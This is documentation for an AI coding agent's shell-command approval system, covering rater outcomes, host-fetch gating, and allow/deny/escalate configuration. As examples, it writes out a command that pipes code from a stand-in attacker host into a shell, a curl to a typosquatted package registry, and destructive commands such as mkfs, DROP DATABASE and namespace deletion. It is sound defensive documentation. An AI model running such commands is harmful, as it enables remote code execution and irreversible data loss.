# Shell tool & approvals

In `gth code`, the agent can run shell commands so it can test its own work — run your suite, check
`git status`, install a package — instead of only reading and writing files. **Approvals** decide
which of those commands run on their own and which stop to ask you. There is one setting, and it is
a ladder of five rungs.

## The main use case: let the agent run your tests, on your terms

Goal: while you work in `gth code`, the agent runs your test suite as it goes, and you decide which
of its other commands are allowed to run.

The general-purpose shell tool (`run_shell_command`) is **on by default in `code` mode**, so you
already have it — just start a session:

```bash
gth code "add a retry to fetchOrders and make the tests pass"
```

Every session starts at **`auto-safe`**, the default rung: the auto-rater rates each command before
it runs. A command it rates safe (running your tests, `git status`) executes with no prompt.
Anything else stops and asks you:

```
The agent wants to run a shell command via run_shell_command
    rm -rf node_modules
⚠ Auto-rater (destructive): deletes a directory tree without confirmation
[s]/[a] will remember exactly this command: { "type": "shell", "matcher": "exact", "pattern": "rm -rf node_modules" }
Approve?  [o]nce   [s]ession   [a]lways   [N]o
```

- **once** — run this one command, then keep asking.
- **session** — run it and stop asking about **that exact command** for the rest of this session.
  It is remembered as the entry shown on the prompt, so a longer command that merely starts with it
  (`rm -rf node_modules dist`) asks again. To trust a whole family of commands at once, write a
  pattern in `approvals.allow` yourself (below) — breadth is always something you choose in a file
  you can read, never something inferred from one answer to one prompt.
- **always** — same as session, but also remembered across future sessions (persisted to
  `.gsloth/.gsloth-settings/shell-allowlist.json`).
- **No** (the default — just press Enter) — reject it. The agent is told what it can do next: run
  the same command with a justification, run a different one, or ask you — so it changes course
  instead of retrying the same thing or giving up.

### What the rater can say

The word in brackets after `⚠ Auto-rater` is one of four outcomes:

- **safe** — runs with no prompt.
- **destructive** — harmful, but you could undo it from inside the session: `rm -rf node_modules`,
  `git reset --hard`. Asks you, with all four choices above.
- **catastrophic** — cannot be undone from inside the session: `mkfs`, `DROP DATABASE`,
  `terraform destroy -auto-approve`, `kubectl delete namespace production`. Asks you *every* time —
  **session** and **always** do not stick for this outcome, so approving one `terraform destroy`
  never approves the next one.
- **attack** — the command's own structure shows something hostile: it goes after a credential for
  its own sake, escalates privilege, installs persistence, impersonates a hostname, or hides what it
  really runs. This one **ends the run** instead of asking. If the command is legitimate and you
  need it, put it in `approvals.allow` (below) — that list is checked before the rater.

Anything the rater cannot assess lands on **destructive** and says so; it never falls back to safe.
Pushing and publishing to somewhere your project already configures — `git push`, `npm publish`,
`docker push` — is ordinary work: the rater may well ask about it, but it never ends the run.

**Read the sentence, not just the word in brackets.** Because "could not assess" also lands on
**destructive**, the bracketed word alone cannot tell you whether a model looked at the command and
judged it, or whether the gate never got an answer. The reason says which — "could not assess this
command: the auto-rater did not answer within 30000ms" is the gate giving up, not a finding about
your command. If you see that one, the fix is a bigger budget (below), not a safer command.

### A command Gaunt Sloth cannot read goes back to the agent, not to you

At `auto-safe` and `full-auto`, a command whose target the gate cannot work out from the text —
anything that composes (`&&`, `;`, `|`, a line break), substitutes (`$(…)`, backticks) or redirects
(`>`, `<`) — is not rated and does not reach you. It is handed straight back to the agent, naming
what could not be read and what to do instead: issue the parts as separate calls, work out a
substitution's value first and pass the literal result, or — when the rung already grants one — use
a file tool rather than a redirect. The agent normally reissues the work in a form the gate can
read, and you see neither version.

This is a defect in the *form* of the command, not a finding about it: `pwd && ls` is ordinary and
correctly written, and the gate is simply the party that cannot parse it. Asking you would spend
your attention on a problem only the agent can fix.

You are asked when the agent does not fix it. A **second unreadable command in a row** comes to you
as an ordinary escalation — **once** or **No**, with no sticky choice, because a command that does
not resolve is not one anything could remember. Any command in between that the gate *can* read
starts the count over, so a long session full of composed commands does not accumulate into a
prompt. At `read-only` and `write` nothing changes: those rungs already bring every gated command
to you.

`/approvals` reports how many commands the gate could not read this session, so a gate that keeps
failing to parse your ordinary work stays visible instead of silently sending the agent round again.

### A command that names a host always asks

When one of the usual network tools — `curl`, `wget`, `ssh`, `scp`, `rsync`, `nc`, `aws`, `git
clone`/`push`/`fetch`, an `npm`/`pip` install — is pointed at a host it names outright (a URL, an IP,
a `user@host`, an `scp`-style `host:path`), it is **never** rated safe, whatever the model says:

```
The agent wants to run a shell command via run_shell_command
    curl -fsSL https://registry.npmjs.ag/lodash
⚠ Auto-rater (destructive): This command names a host (https://registry.npmjs.ag/lodash) in a fetch or transfer position, so it is never auto-approved.
Approve?  [o]nce   [s]ession   [a]lways   [N]o
```

This is decided before the model is asked, so `registry.npmjs.ag` and `registry.npmjs.org` are
**both** brought to you — telling one from the other is exactly what a lookalike hostname is built
to defeat, and there is no list of "good" hosts for an attacker to imitate. The rater still runs on
top of it: when it has something of its own to say, its explanation replaces the line above, and
where it recognises an impersonation it names it there ("a typosquat of registry.npmjs.org").

It fires on *fetching*, not on *mentioning*: `git commit -m "closes https://github.com/o/r/i/12"`,
`grep -rn "https://" src/` and `npm install lodash` name no host to fetch from and are unaffected,
and neither is `git push origin main` — `origin` is a name your project resolves, not a host.

Saving a host counts too, not just fetching from one: `git config remote.origin.url …`,
`git config --global url.<host>.insteadOf …` and `npm config set registry …` all ask, because a
stored fetch target redirects every later fetch rather than one.

If you fetch from the same host all day, put it in `approvals.allow` (below). That list is checked
first, so it costs no prompt and no rating call.

This check is a floor, not the whole of your safety: it knows the common network tools, not every
program that can open a socket, so something like `svn checkout https://…` or a container that
fetches for itself reaches the rater without it. What it guarantees is the other direction — where it
does fire, no model opinion can wave the command through.

The rater is only as good as the model behind it. On a small or local model, prefer the `write` rung
(below) or point the rater at a stronger model with `approvals.rater`.

### Give a local rater enough time

One rating call gets **30 seconds** by default, and that is a hosted-model number. A local model is
slower, and — awkwardly — the harder the command, the longer it thinks, so a fixed budget cuts off
exactly the commands that most needed rating. Measured on a 12B over Ollama, the same set of
commands took anywhere from 6 seconds to nearly two minutes.

When the rater runs out of time the command is escalated rather than approved, which is safe but is
also the opposite of what `auto-safe` and `full-auto` are for: you end up being asked about
everything, and nothing tells you why. So gth says so, once per occurrence, and you can raise the
budget:

```json
{
  "approvals": {
    "mode": "full-auto",
    "rater": "local-rater",
    "raterTimeoutMs": 120000
  }
}
```

It is a number you set rather than one gth guesses from the provider, because a guess about your
hardware that turns out wrong fails quietly.

To have the agent run tests *without* any of this, give it the fixed `run_tests` dev-command tool:
you set the exact command, and because there is nothing for the model to choose, it runs with **no
rating and no prompt**. Put this in `.gsloth.config.json` at your project root:

```json
{
  "commands": {
    "code": {
      "filesystem": "all",
      "builtInTools": {
        "gth_checklist": true,
        "gth_grep": true,
        "run_tests": { "command": "npm test" },
        "run_shell_command": { "timeout": 300000 }
      }
    }
  }
}
```

Now `run_tests` runs `npm test` on demand, while any *other* command the agent composes (a `git`
commit, `npm install`, a one-off script) goes through the rater. The `timeout` bump gives a slow
command up to 300000 ms (5 minutes) before it is killed; the default is 120000 ms.

A per-command `builtInTools` object **replaces** the default set entirely, which is why
`gth_checklist` and `gth_grep` (the two defaults) are listed explicitly — drop them and they are
gone.

## The ladder: `approvals`

There is one approvals setting, and it takes the rung name:

```json
{ "approvals": "auto-safe" }
```

| Rung | What it grants | Rater |
|---|---|---|
| `read-only` | Gaunt Sloth may automatically read and list files in the current working folder. It asks for approval for anything else, until you tell it to always allow a command. | no |
| `write` | Gaunt Sloth may automatically read, edit, create and delete files in the current working folder. It asks for approval for anything else, until you tell it to always allow a command. | no |
| `auto-safe` | Same as write, plus the auto-rater rates everything else and automatically approves what it rates as safe; anything questionable comes to you. Gaunt Sloth can still rewrite and delete files in your working folder without asking — "safe" means each action is checked for reaching outside that folder or harming your system, not that nothing changes. | yes |
| `full-auto` | The auto-rater steers Gaunt Sloth: it decides for itself and does not stop to ask you. This is safer than bypass — the auto-rater still stops the run on a command that reads your keys or passwords, weakens permissions, installs itself to run again later, or hides what it does; it brings anything it cannot undo to you rather than deciding alone; and your deny list still applies — but it is **not** safe. Gaunt Sloth will change and delete things. Use it where the consequences are recoverable, and put real gates (deployment approvals, two-factor, branch protection) on anything that is not. | yes |
| `bypass` | No gate. Gaunt Sloth runs whatever it decides to run, without asking and without rating. Only the refusals configured in the deny list in your config still apply. | no |

`read-only`, `write` and `bypass` consult no model at all, so they are reproducible and cost
nothing. `auto-safe` spends one rating call per gated command.

`bypass` is **not** a higher-autonomy rung than `full-auto` — both let the agent act without asking;
`bypass` is the same autonomy with the checks removed.

Switch rung for the current session with `/approvals read-only|write|auto-safe|full-auto|bypass`
(see [Interactive sessions](interactive-sessions.md#slash-commands)).

## The agent knows which of its tools cost you a prompt

The cheapest approval is the one that never happens, so the agent is told the posture up front: at
every rung except `bypass`, the description of each tool that needs approval gains a sentence
saying so, and the tools that run freely say nothing. The shell is the only gated tool today, so it
is the only description that changes — at `read-only` and `write` it says the call *will* require
your approval, at `auto-safe` that it *may*, and at `full-auto` that the auto-rater may refuse it.
Each sentence also tells the agent to reach for the shell only when the other tools cannot do the
job.

The auto-rater backs that up at `auto-safe` and `full-auto`. When it does not rate a command safe
and one of the tools the agent already has would do the same job, it names that tool in its
explanation, so the tool shows up on the rater line of the approval prompt:

```
⚠ Auto-rater (destructive): rewrites a file in place; edit_file does this without a shell
```

If you then decline, the agent is told that `edit_file` needs no approval and will not interrupt
you — which is what makes it take the other route rather than re-arguing this one.

A named alternative is a suggestion, never an approval: it does not run the command, and the
suggested tool is gated on its own terms when the agent calls it. If nothing the agent already has
can do the job — a path outside your working folder, an install, a call to a service — the rater
names nothing.

## The extras: rater, allow, deny, escalate

When you need more than the rung, write the object form instead. The scalar above is exactly sugar
for `{ "mode": <value> }`:

```json
{
  "approvals": {
    "mode": "auto-safe",
    "rater": "safety-rater",
    "allow": [
      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
    ],
    "deny": [
      { "type": "shell", "matcher": "exact", "pattern": "git push --force" },
      { "type": "shell", "matcher": "glob", "pattern": "npm publish*" }
    ],
    "escalate": [
      { "type": "shell", "matcher": "exact", "pattern": "terraform apply" }
    ]
  },
  "commands": {
    "pr": { "approvals": "read-only" }
  }
}
```

- **`rater`** — the name of an identity profile whose model does the rating, instead of the session
  model. This is the fix for a weak main model: point it at a stronger one. A name that does not
  resolve is a config error, never a silent fallback. It is only consulted at `auto-safe` and
  `full-auto`.
- **`allow`** — what you trust. Checked **before** the rater at every rung except `bypass`, so an
  allow-listed call never prompts. This is the supported way to make a non-interactive pipeline
  pass.
- **`deny`** — what never runs. Checked **before** `allow` and before the rater, and it is the one
  check `bypass` keeps: choosing `bypass` means *"stop asking me"*, not *"forget what I told you
  never to do"*.
- **`escalate`** — what always asks you, whatever the rung would have done, and with no rating call.
  It outranks `allow`, including a grant you made at a prompt, so *this specific thing asks even
  though its class would not*. It is **inert at `bypass`**: that rung means *stop asking me*, and
  the rung you chose for the session wins. A stop that must survive `bypass` is a `deny` entry.

Where entries from more than one list match the same call, **the most restrictive one wins — deny
over escalate over allow** — so the order you write them in never matters.

All three are read-only input: Gaunt Sloth merges them with what you approve or reject at the
prompt, and never writes back to your config file.

A per-command value overrides **only the fields it names**. `"commands": { "pr": { "approvals":
"read-only" } }` above says the `pr` command has no business writing files, whatever the root
setting is — and that is *all* it says: the rung changes, and `rater`, `raterTimeoutMs` and the
lists still come from the root.

The lists do not all merge the same way, and the difference is deliberate:

- **`deny` and `escalate` add up**, across every scope and both config layers. A command-specific
  `deny` entry joins the root's rather than standing in for it, and a global config's entries join
  your project's. So a per-command rung can never quietly drop a prohibition you wrote at the root
  — which matters most at `bypass`, where your deny list is nearly the last check left. The flip
  side: **removing an inherited `deny` or `escalate` entry for one command is not expressible.** If
  a command needs to be free of a rule, the rule does not belong at the root.
- **`allow` is replaced** when a command (or the higher config layer) states its own, and inherited
  when it does not. So you *can* narrow what a command runs unprompted — give it its own `allow`
  list, and the root's no longer applies there.

The reason they differ is what each mistake costs you. A missed `allow` entry means one extra
prompt; a missed `deny` entry means the rater still looks at the call. Neither runs anything. A
**too-broad `allow` entry runs, without asking and without rating** — so the restrictive lists
grow across scopes, and the permissive one does not.

### Writing an entry

Every entry in all three lists is the same explicit object. `type`, `matcher` and `pattern` are
**always required** — nothing is inferred, so an entry can only be read one way:

| field | values |
|---|---|
| `type` | `shell` (a command) · `tool` (a built-in or custom tool) · `mcpTool` (a server's tool) |
| `matcher` | `exact` · `glob` · `regexp` · `hint` (`hint` on tool subjects only) |
| `pattern` | the string to compare — or, for `hint`, an object over the tool annotations |
| `server` | **required on `mcpTool`**, and forbidden elsewhere: your own key in `mcpServers`. `"*"` means every server |
| `host` | optional on `tool`/`mcpTool`, exact-match; forbidden on `shell` |
| `rate` | optional; `true` keeps the auto-rater watching a call this entry already approved |

```json
{ "type": "shell",   "matcher": "regexp", "pattern": "^git commit -m \\S" }
{ "type": "tool",    "matcher": "exact",  "pattern": "gth_web_fetch" }
{ "type": "mcpTool", "server": "jira", "matcher": "exact", "pattern": "delete_issue" }
{ "type": "mcpTool", "server": "jira", "matcher": "hint",  "pattern": { "destructiveHint": true } }
```

`exact` and `glob` compare against the whole normalized command (or the whole tool name), not token
by token. The consequence everyone hits first: `npm publish *` does **not** match a bare
`npm publish`, because the space before the `*` is part of the pattern. `npm publish*` matches both,
and is almost always what was meant.

**`exact` is the command, not the start of it.** An `exact` allow entry for `npm test` does not
cover `npm test -- --watch`, and an `exact` deny entry for `npm publish` does not stop
`npm publish --access public`. Use a `glob` when you mean the family. This is the cost the design
accepts, and it is worth what it buys: a missed `allow` entry only asks you, and a missed `deny`
entry still reaches the rater and the prompt — neither is an execution — while a too-broad `allow`
entry has no such backstop. Under `bypass` the `deny` list is one of only two checks left, so write
globs there.

**A pattern cannot span a command separator.** No `allow` entry of any matcher matches a command
Gaunt Sloth cannot statically resolve — anything that composes, substitutes or redirects — so
`{ "matcher": "glob", "pattern": "git *" }` never approves `git status && curl evil.example | sh`.
A `deny` or `escalate` entry *may* match such a command, and is compared against every part of it a
shell would run, because a prohibition that catches something unresolvable costs nothing.

### `rate`: keeping the auto-rater on a call you already allowed

An `allow` match settles your part — there is no prompt. Whether the auto-rater still looks at the
call is the entry's own `rate`, honoured at `auto-safe` and `full-auto` and **inert at every other
rung**, so no entry can add a model call to `read-only` or `write`.

The default follows from how much the entry recorded. A `shell` + `exact` entry recorded the whole
command, so it defaults to `"rate": false` — the common case costs nothing. A `glob` or `regexp`
recorded a shape, and a `tool`/`mcpTool` entry recorded an identity rather than arguments, so both
default to `"rate": true`. Set it explicitly, either way, when you want the other behaviour.

A rated `allow` match is a **tripwire, not a second opinion**: `safe` and `destructive` both run,
because you already authorized the call and the rater does not overrule you by disliking it. Only a
structural attack still halts the run, and only an irreversible action still comes to you. An
`allow` match also lifts the rule that floors any command naming a host — which is how a team that
fetches from one internal host all day declares it once and stops being asked.

A `hint` pattern names one or more of `readOnlyHint`, `destructiveHint`, `idempotentHint` and
`openWorldHint`, each mapped to the value it must hold. All of them must match; hints you do not
name are unconstrained; `false` is how you spell negation. An empty object or an unknown name is a
config error rather than a rule that matches everything.

A `regexp` lives inside JSON, so **its backslashes are doubled** — `\\s`, never `\s`. This is worth
saying because `\s` is not a valid JSON escape: the mistake fails the whole config file to parse,
and the error points at a line number rather than at your pattern. Patterns are compiled and
length-checked when the config loads, so one that cannot compile is an error you see at startup.

## Non-interactive runs

Where there is nobody to ask — CI, a one-shot `gth exec`, a server — an escalation is not a prompt:
the run **exits non-zero**, printing the command, its rating and the reason. It never waits, and it
never times out into an approval. Declare what the pipeline is allowed to run:

```json
{
  "approvals": {
    "mode": "auto-safe",
    "allow": [
      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
      { "type": "shell", "matcher": "exact", "pattern": "npm run build" },
      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
    ]
  },
  "commands": { "exec": { "builtInTools": { "run_shell_command": { "enabled": true } } } }
}
```

## Examples

```json
// Confirm every shell command yourself, while the agent still edits files freely
{ "approvals": "write" }

// Rate with a stronger model than the session's
{ "approvals": { "mode": "auto-safe", "rater": "safety-rater" } }

// Let the agent work unattended, but never let it publish
{ "approvals": { "mode": "full-auto", "deny": [
  { "type": "shell", "matcher": "glob", "pattern": "npm publish*" },
  { "type": "shell", "matcher": "glob", "pattern": "git push --force*" }
] } }

// Fixed dev commands, no arbitrary shell at all
{ "commands": { "code": { "builtInTools": {
  "gth_checklist": true, "gth_grep": true,
  "run_tests":  { "command": "npm test" },
  "run_lint":   { "command": "npm run lint" },
  "run_build":  { "command": "npm run build" },
  "run_shell_command": false
} } } }

// Cap the output the shell tool feeds back to the model (default 100000 bytes)
{ "commands": { "code": { "builtInTools": {
  "run_shell_command": { "maxOutputBytes": 200000 }
} } } }
```

## Related

- Every `builtInTools` key and its defaults: [Tools configuration](../configuration/tools.md).
- The `/approvals` slash command: [Interactive sessions](interactive-sessions.md#slash-commands).
- Migrating a pre-2.0 `yolo` / `judge` config, or a CFG-26 `mode`/`strictness`/`escalate` one:
  [Migration](../MIGRATION.md#i-approvals-and-the-ai-rater-hard).
- The `code` / `exec` commands and their flags: [Commands](../COMMANDS.md#code).
- Give the agent project rules while it codes: [Code with your rules](code-with-your-rules.md).
